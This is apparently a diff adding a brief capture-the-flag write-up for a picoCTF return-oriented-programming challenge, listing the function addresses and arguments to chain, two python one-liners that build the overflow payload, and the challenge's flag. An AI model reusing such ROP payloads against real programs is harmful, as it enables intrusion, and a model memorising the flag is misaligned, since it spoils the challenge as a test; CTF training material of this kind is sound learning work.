@@ -1,0 +1,21 @@
+Can you exploit the following program [1]  and get the flag? You can findi the
+program in /problems/rop-chain_4_6ba0c7ef5029f471fc2d14a771a8e1b9 on the shell
+server? Source [2] .
+
+Need to return to win_function1 at address: 0x080485cb
+Need to return to main at address: 0x0804873b
+Need to return to win_function2 at address: 0x080485d8
+With argument: 0xBAAAAAAD
+Need to return to main at address: 0x0804873b
+Need to return to flag at address: 0x0804862b
+With argument: 0xDEADBAAD
+
+or, load win1, win2, flag, baaaaaad, and deadbaad up into your buffer and
+let her rop. 
+
+python -c "print('A'*28+ '\xcb\x85\x04\x08'+'\x3b\x87\x04\x08' +'\n' + 'A'*28 + '\xd8\x85\x04\x08'+'\x3b\x87\x04\x08'+'\xAD\xAA\xAA\xBA' + '\n'+ 'A'*28 + '\x2b\x86\x04\x08' + 'CCCC' + '\xAD\xBA\xAD\xDE')"
+
+python -c "from pwn import *; print('A'*28 + p32(0x080485cb) + p32(0x080485d8) + p32(0x0804862b) + p32(0xBAAAAAAD) + p32(0xDEADBAAD))"
+
+
+Answer: picoCTF{rOp_aInT_5o_h4Rd_R1gHt_718e6c5c}
